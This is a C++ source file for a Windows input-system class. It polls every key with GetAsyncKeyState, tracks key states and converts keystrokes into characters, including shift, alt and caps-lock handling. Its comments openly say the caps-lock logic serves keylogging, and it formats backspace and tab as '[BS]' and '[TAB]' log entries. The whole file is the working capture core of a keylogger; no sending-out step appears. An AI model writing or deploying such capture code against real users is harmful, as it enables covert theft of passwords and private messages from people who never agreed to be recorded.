#include "pch.h"
#include "inputsystem.h"

c_inputsystem::c_inputsystem( ) {
    for ( auto& it : m_button_states )
        it = 0u;
}

void c_inputsystem::get_keystates( ) {
    // loop all the keys and get the state and simply let handle_key_state handle the output
    for ( int i = 0; i < 0xFF; i++ ) {
        short state = GetAsyncKeyState( i );

        handle_key_state( i, state & 0x8000, state & 0x1 );
    }

    // do an additional call to GetKeyState for CAPS_LOCK to get the toggled state for it.
    // for GetKeyState the low-order bit is used for the Toggled state, but in GetAsyncKeyState that bit is used as "pressed since last call"
    // kind of dirty but it works, instead of rewriting the handle_key_state functions just for this one specific case which uses GetKeyState instead of GetAsyncKeyState
    // this is really only useful for keylogging-purposes to know what kind of character to produce. 
    short state = GetKeyState( VK_CAPITAL );
    if ( state & 0x1 )
        m_button_states.at( VK_CAPITAL ) |= TOGGLED;
    else
        m_button_states.at( VK_CAPITAL ) &= ~TOGGLED;


}

void c_inputsystem::handle_key_state( const int32_t key_code, const bool down, const bool key_repeat ) {
    auto& button_state = m_button_states.at( key_code );

    // start with clearing the temporary states for the current key ( RELEASED and PRESSED )
    button_state &= ~PRESSED;
    button_state &= ~RELEASED;

    // instead of actually using the "PRESSED" state that is built-in from GetAsyncKeyState for the low-order bit, figure it out ourselves instead so its easily portable:
    // if key is down set the HELD flag, also set the PRESSED flag if previous was not down
    // if key is up unset the HELD flag and set the RELEASED flag is previous was down.
    if ( down ) {
        if ( !( button_state & HELD ) )
            button_state |= PRESSED;
        button_state |= HELD;
    }
    else {
        if ( button_state & HELD )
            button_state |= RELEASED;
        button_state &= ~HELD;
    }

    // if key_repeat is true it means a key repeat from holding the button down happened, which in turn means another "press"
    if ( key_repeat )
        button_state |= PRESSED;
}

bool c_inputsystem::get_state( const int32_t key_code, const keystate_t state ) {
    return m_button_states.at( key_code ) & state;
}

std::wstring c_inputsystem::get_character( const int32_t key_code ) {
    // temporary keystate to keep the modifiers in (caps lock, shift, alt)
    BYTE key_states[ 0x100 ];
    memset( key_states, 0, 0x100 );

    // set the modifier buttons when needed ( just set all the bits with -1, who cares )
    if ( get_state( VK_SHIFT, HELD ) ) {
        key_states[ VK_SHIFT ] = -1;
        key_states[ VK_LSHIFT ] = -1;
    }
    if ( get_state( VK_CONTROL, HELD ) ) {
        key_states[ VK_CONTROL ] = -1;
        key_states[ VK_LCONTROL ] = -1;
    }
    if ( get_state( VK_MENU, HELD ) ) {
        key_states[ VK_MENU ] = -1;
        key_states[ VK_LMENU ] = -1;
    }
    if ( get_state( VK_CAPITAL, TOGGLED ) ) {
        key_states[ VK_CAPITAL ] = -1;
    }

    // get the unicode name for the key through the win-api
    auto layout = GetKeyboardLayout( 0 );
    auto scancode = MapVirtualKeyExW( key_code, MAPVK_VK_TO_VSC, layout );

    WCHAR out[ 128 ];
    int ret = ToUnicodeEx( key_code, scancode, key_states, out, 128, 0, layout );

    if ( ret == -1 || !ret )
        return std::wstring( );

    // handle backspaces, tabs and enter-keys accordingly (by doing an actual newline instead of only carriage-return for enter, and printing identifier for tabs/backspaces)
    if ( !lstrcmpW( out, L"\r" ) )
        return std::wstring( L"\r\n" );
    if ( !lstrcmpW( out, L"\b" ) )
        return std::wstring( L"[BS]" );
    if ( !lstrcmpW( out, L"\t" ) )
        return std::wstring( L"[TAB]" );

    // make the WCHAR into a normal CHAR, we can just cast it since its a single character.
    return std::wstring( out );
}
